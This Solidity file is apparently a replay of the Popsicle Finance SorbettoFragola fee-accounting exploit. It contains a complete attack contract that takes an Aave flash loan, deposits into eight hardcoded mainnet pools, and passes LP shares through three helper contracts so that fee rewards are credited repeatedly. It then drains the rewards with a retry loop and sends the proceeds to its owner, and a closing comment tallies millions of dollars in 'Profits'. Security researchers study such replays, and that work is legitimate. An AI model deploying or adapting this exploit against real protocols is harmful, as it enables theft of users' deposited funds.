// SPDX-License-Identifier: agpl-3.0
pragma solidity 0.6.12;

import { FlashLoanReceiverBase } from "./FlashLoanReceiverBase.sol";
import { ILendingPool, ILendingPoolAddressesProvider, IERC20, IERC20_USDT } from "./Interfaces.sol";
import { SafeMath, TransferHelper } from "./Libraries.sol";
import { ISorbettoFragola } from "./ISorbettoFragola.sol";
import "hardhat/console.sol";

// Attack Contract A and B interface
interface IAttackContract {
    // Calls "SorbettoFragola.collectFees(amount0, amount1)"
    function getFees(address sorbettoAddr, uint256 amount0, uint256 amount1) external;
    // Calls "SorbettoFragola.userInfo(user)"
    function getUserInfo(address sorbettoAddr, address user) external returns (uint256, uint256, uint256, uint256);
    // Sends "amount" number of "tokenAddr" tokens to "receiverAddr". If "amount == 0" then sends all of its contract balance.
    function transferTokens(address tokenAddr, address receiverAddr, uint256 amount) external;
}

contract AttackInit is FlashLoanReceiverBase {
    using SafeMath for uint256;

    address aaveV2 = 0xB53C1a33016B2DC2fF3653530bfF1848a515c8c5;
    address usdtAddr = 0xdAC17F958D2ee523a2206206994597C13D831ec7;
    address owner;
    address attackContract1;
    address attackContract2;
    address attackContract3;
    uint256 MAX_COLLECT_FEE_TRIES = 5;

    constructor(address _attackContract1, address _attackContract2, address _attackContract3)
        FlashLoanReceiverBase(ILendingPoolAddressesProvider(aaveV2))
        public
    {
        owner = msg.sender;
        // !! Already deployed Attack Contracts A, B and C
        attackContract1 = _attackContract1;
        attackContract2 = _attackContract2;
        attackContract3 = _attackContract3;
    }

    function exploit() public {
        myFlashLoanCall();  // Exploit w/ Flash Loan as the initial capital
        sendProfitToOwner();  // [Misc] Transfer the funds to owner
    }

    // Redeem the rewards from Popsicle assigned to *attackContract* by SorbettoFragola contract in *fragolaAddr*.
    // Send the rewards to the initial Attack Contract (this contract)
    function collectFromAttackContract(address attackContract, address fragolaAddr, address token0, address token1) internal {
        // Get the reward amounts
        (uint token0Rewards, uint token1Rewards, , ) = IAttackContract(attackContract).getUserInfo(fragolaAddr, attackContract);
        // console.log("Init Rewards are -> Token0: %s, Token1: %s", token0Rewards, token1Rewards);

        // The reward amounts might be greater than the actual amounts in the pool.
        // We cannot withdraw more tokens than those that exist in the pool. So in this case, we experiment by continuously halving the amount
        // of the rewards we request from the pool, until we (are close to) drain it. We half exactly MAX_COLLECT_FEE_TRIES times.
        uint tries = 0;
        while (tries < MAX_COLLECT_FEE_TRIES) {
            try IAttackContract(attackContract).getFees(fragolaAddr, token0Rewards, token1Rewards) {
                // We effectively got a part of the rewards
                (token0Rewards, token1Rewards, , ) = IAttackContract(attackContract).getUserInfo(fragolaAddr, attackContract);
                // console.log("Try: %s - Rewards are -> Token0: %s, Token1: %s", tries, token0Rewards, token1Rewards);
            }
            catch Error(string memory) {
                // We are probably asking more tokens than the pool has to offer, so half the requested amount.
                token0Rewards /= 2;
                token1Rewards /= 2;
            }
            tries += 1;
        }

        // Transfer the reward tokens effectively redeemed to the initial Attack Contract.
        IAttackContract(attackContract).transferTokens(token0, address(this), 0);
        IAttackContract(attackContract).transferTokens(token1, address(this), 0);
    }

    // Exploit a single SorbettoFragola contract
    function exploitSinglePool(address fragolaAddr) internal {
        address myAddr = address(this);
        address token0 = ISorbettoFragola(fragolaAddr).token0();
        address token1 = ISorbettoFragola(fragolaAddr).token1();

        // Deposit token0 and token1 tokens to SF
        uint currBalance0 = IERC20(token0).balanceOf(myAddr);
        uint currBalance1 = IERC20(token1).balanceOf(myAddr);
        myApproveWrap(token0, fragolaAddr, currBalance0);
        myApproveWrap(token1, fragolaAddr, currBalance1);
        ISorbettoFragola(fragolaAddr).deposit(currBalance0, currBalance1);
        // By depositing, we obtain PL tokens
        // Exploit loop: 1) Send the PL tokens to another contract,
        //               2) Call "SorbettoFragola.collectFees(0,0)" from that contract to *update* rewards for the currently owned PL tokens
        //               3) Go to 1
        uint totalShares = IERC20(fragolaAddr).balanceOf(myAddr);
        IERC20(fragolaAddr).transfer(attackContract1, totalShares);  // Send the PL tokens to Attack Contract A 
        IAttackContract(attackContract1).getFees(fragolaAddr, 0, 0); // CollectFees from A - Update rewards for A 
        IAttackContract(attackContract1).transferTokens(fragolaAddr, attackContract2, 0);  // Send the PL tokens from AC A to Attack Contract B 
        IAttackContract(attackContract2).getFees(fragolaAddr, 0, 0);  // CollectFees from B - Update rewards for B
        IAttackContract(attackContract2).transferTokens(fragolaAddr, attackContract3, 0);  // Return the PL tokens from AC B to Attack Contract C
        IAttackContract(attackContract3).getFees(fragolaAddr, 0, 0);  // CollectFees from C- Update rewards for C
        IAttackContract(attackContract3).transferTokens(fragolaAddr, myAddr, 0);  // Return the PL tokens from AC C to the initial Attack Contract
        
        // Withdraw all deposited assets (without rewards)
        totalShares = IERC20(fragolaAddr).balanceOf(myAddr);
        ISorbettoFragola(fragolaAddr).withdraw(totalShares);

        // Collect the rewards assigned by step 2 of the Exploit loop
        collectFromAttackContract(attackContract1, fragolaAddr, token0, token1);  // Collect Rewards from AC A
        collectFromAttackContract(attackContract2, fragolaAddr, token0, token1);  // Collect Rewards from AC B
        collectFromAttackContract(attackContract3, fragolaAddr, token0, token1);  // Collect Rewards from AC C
    }


    // Exploit every UNI-V3 swap pool managed by Popsicle.
    // Each address refers to a distinct SorbettoFragola contract, with the underlying assets denoted in the comments.
    function exploitEveryPool() internal {
        exploitSinglePool(0x98d149e227C75D38F623A9aa9F030fB222B3FAa3);  // USDT/WETH (1)
        exploitSinglePool(0xc4ff55a4329f84f9Bf0F5619998aB570481EBB48);  // USDT/WETH (2)
        exploitSinglePool(0xd63b340F6e9CCcF0c997c83C8d036fa53B113546);  // USDC/WETH
        exploitSinglePool(0x0A8143EF65b0CE4C2fAD195165ef13772ff6Cca0);  // WBTC/WETH
        exploitSinglePool(0xB53Dc33Bb39efE6E9dB36d7eF290d6679fAcbEC7);  // WBTC/USDC
        exploitSinglePool(0x6f3F35a268B3af45331471EABF3F9881b601F5aA);  // USDC/WETH
        exploitSinglePool(0xDD90112eAF865E4E0030000803ebBb4d84F14617);  // DAI/WETH
        exploitSinglePool(0xE22EACaC57A1ADFa38dCA1100EF17654E91EFd35);  // UNI/WETH
    }


    // Called after the FL is received
    function executeOperation(address[] calldata assets, uint256[] calldata amounts, uint256[] calldata premiums, address, bytes calldata) external override returns (bool)
    {
        exploitEveryPool();  // Exploit logic

        for (uint i = 0; i < assets.length; i++) {  // Return the borrowed assets to AAVE
            uint amountOwing = amounts[i].add(premiums[i]);
            myApproveWrap(assets[i], address(LENDING_POOL), amountOwing);
        }
        return true;
    }

    // Request the FL
    function myFlashLoanCall() internal {
        address receiverAddress = address(this);

        address[] memory assets = new address[](6);
        assets[0] = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC
        assets[1] = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH
        assets[2] = address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
        assets[3] = address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984); // UNI
        assets[4] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); // DAI
        assets[5] = address(0xdAC17F958D2ee523a2206206994597C13D831ec7); // USDT

        uint256[] memory amounts = new uint256[](6);
        amounts[0] = 30 * 1e12;  // USDC
        amounts[1] = 13 * 1e21;  // WETH
        amounts[2] = 140 * 1e9;  // WBTC
        amounts[3] = 200 * 1e21;  // UNI
        amounts[4] = 3 * 1e24;  // DAI
        amounts[5] = 30 * 1e12;  // USDT

        uint256[] memory modes = new uint256[](6);
        modes[0] = 0; modes[1] = 0; modes[2] = 0; modes[3] = 0; modes[4] = 0; modes[5] = 0;

        address onBehalfOf = address(this);
        bytes memory params = "";
        uint16 referralCode = 0;
        LENDING_POOL.flashLoan(receiverAddress,assets,amounts,modes,onBehalfOf,params,referralCode);
    }

    function sendProfitToOwner() internal {
        address[] memory assets = new address[](6);
        assets[0] = address(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48); // USDC
        assets[1] = address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2); // WETH
        assets[2] = address(0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599); // WBTC
        assets[3] = address(0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984); // UNI
        assets[4] = address(0x6B175474E89094C44Da98b954EedeAC495271d0F); // DAI
        assets[5] = address(0xdAC17F958D2ee523a2206206994597C13D831ec7); // USDT
        for (uint i = 0; i < assets.length; i++) {
            uint balance = IERC20(assets[i]).balanceOf(address(this));
            TransferHelper.safeTransfer(assets[i], owner, balance);
        }
    }

    // USDT needs special handle of its approve function since it doesn't conform to ERC20...
    function myApproveWrap(address _tokenAddr, address _fragolaAddr, uint256 _amount) internal {
        if (_tokenAddr != usdtAddr)
            require(IERC20(_tokenAddr).approve(_fragolaAddr, _amount), "ApproveWrap failed");
        else
            IERC20_USDT(usdtAddr).approve(_fragolaAddr, _amount);
    }

    // Check the balance of a given address in the tokens targeted by the exploit
    function checkBalance(address addressToCheck) public view {
        address wethAddr = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
        address wbtcAddr = 0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599;
        address usdcAddr = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;
        address daiAddr = 0x6B175474E89094C44Da98b954EedeAC495271d0F;
        address uniAddr = 0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984;
        uint balance;
        console.log("----ATK BALANCES of %s ----", addressToCheck);
        balance = IERC20(usdtAddr).balanceOf(addressToCheck);
        console.log("USDT: ", balance);        
        balance = IERC20(wethAddr).balanceOf(addressToCheck);
        console.log("WETH: ", balance);
        balance = IERC20(usdcAddr).balanceOf(addressToCheck);
        console.log("USDC: ", balance);
        balance = IERC20(wbtcAddr).balanceOf(addressToCheck);
        console.log("WBTC: ", balance);
        balance = IERC20(daiAddr).balanceOf(addressToCheck);
        console.log("DAI: ", balance);
        balance = IERC20(uniAddr).balanceOf(addressToCheck);
        console.log("UNI: ", balance);
        console.log("----END BALANCES of %s ----", addressToCheck);
    }
}

// --- Profits:
// USDT:  4.968.657,105095
// WETH:  2.522,388708375332491449
// USDC:  5.182.425,985746
// WBTC:  91,13643560
// DAI:  158.127,036872370642545683
// UNI:  9,687520423129001081845
